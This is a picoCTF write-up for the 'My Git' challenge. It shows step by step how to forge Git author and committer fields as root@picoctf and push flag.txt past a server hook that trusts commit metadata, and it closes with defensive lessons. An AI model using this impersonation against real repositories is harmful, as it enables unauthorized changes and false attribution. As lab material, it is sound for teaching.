---
title: "MY GIT"
description: "picoCTF My Git writeup forging a Git commit identity to bypass repository validation checks and retrieve the flag."
category: "picoCTF - General Skills"
tags: ["picoctf", "general-skills"]
published: true
---
# MY GIT

## Challenge

**Category:** General Skills  
**Name:** MY GIT

**Prompt:**

> I have built my own Git server with my own rules!
> You can clone the challenge repo using the command below.
>
> `git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git`
>
> Here's the password: `3a51a2e1`
> Check the README to get your flag!

## Goal

Clone the custom Git repository, understand the server's special rule, and recover the flag.

## Initial observation

The challenge title and prompt strongly suggest this is not about normal Git usage. The important phrase is:

> I have built my own Git server with my own rules!

That usually means:

- the server has custom hooks
- something interesting happens on `push`
- the README contains the actual hint

## Step 1: Clone the repository

```bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
```

Because the repo is served over SSH on a custom port, Git prompts for:

- host authenticity confirmation the first time
- the password provided in the challenge

Password used:

```text
3a51a2e1
```

## Step 2: Read the README

```bash
cat README.md
```

Contents:

```md
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
```

## Key insight

The server is not checking who authenticated over SSH in a secure way. Instead, it appears to trust Git metadata inside a pushed commit.

That is a mistake because Git commit metadata is user-controlled.

In Git, the following fields can be set to anything:

- author name
- author email
- committer name
- committer email

So if the custom server only checks whether the pushed commit claims to be from:

```text
root <root@picoctf>
```

then we can impersonate that identity trivially.

## Step 3: Create a `flag.txt` file

The README says the server only updates `flag.txt`, so we need to include that file in our commit.

```bash
printf 'please update me\n' > flag.txt
git add flag.txt
```

Explanation:

- `printf` creates a placeholder file
- `git add flag.txt` stages it for commit

The contents do not matter much. The server only cares that:

- `flag.txt` exists in the pushed commit
- the commit appears to come from `root@picoctf`

## Step 4: Forge the Git identity

Make the commit with both author and committer set to the expected identity:

```bash
GIT_AUTHOR_NAME='root' \
GIT_AUTHOR_EMAIL='root@picoctf' \
GIT_COMMITTER_NAME='root' \
GIT_COMMITTER_EMAIL='root@picoctf' \
git commit -m 'Add flag.txt for server update'
```

What these environment variables do:

- `GIT_AUTHOR_NAME` sets the commit author name
- `GIT_AUTHOR_EMAIL` sets the commit author email
- `GIT_COMMITTER_NAME` sets the committer name
- `GIT_COMMITTER_EMAIL` sets the committer email

This works because Git does not cryptographically verify those identity fields by default.

## Step 5: Verify the forged metadata locally

```bash
git show --quiet --format=fuller HEAD
```

Expected output shape:

```text
Author:     root <root@picoctf>
Commit:     root <root@picoctf>
```

This confirms the pushed commit will claim to be from the target identity.

## Step 6: Push to the remote server

```bash
git push origin master
```

Use the same SSH password again when prompted:

```text
3a51a2e1
```

## Server response

The remote hook responded with:

```text
remote: Author matched and flag.txt found in commit...
remote: Congratulations! You have successfully impersonated the root user
remote: Here's your flag: picoCTF{<redacted>}
```

## Flag

```text
picoCTF{<redacted>}
```

## Why this works

The vulnerability is **trusting unauthenticated Git metadata**.

The server should have verified identity using something stronger, such as:

- authenticated SSH account mapping
- signed commits
- server-side authorization rules not based on author strings

Instead, it trusted fields that the attacker fully controls.

That allowed us to impersonate:

```text
root <root@picoctf>
```

without actually logging in as root.

## Minimal solve path

```bash
git clone ssh://git@foggy-cliff.picoctf.net:60262/git/challenge.git
cd challenge
cat README.md
printf 'please update me\n' > flag.txt
git add flag.txt
GIT_AUTHOR_NAME='root' GIT_AUTHOR_EMAIL='root@picoctf' GIT_COMMITTER_NAME='root' GIT_COMMITTER_EMAIL='root@picoctf' git commit -m 'Add flag.txt for server update'
git push origin master
```

## Takeaway

Git commit identity is not proof of authorship. If a server makes authorization decisions based only on author or committer name/email fields, it is vulnerable to impersonation.
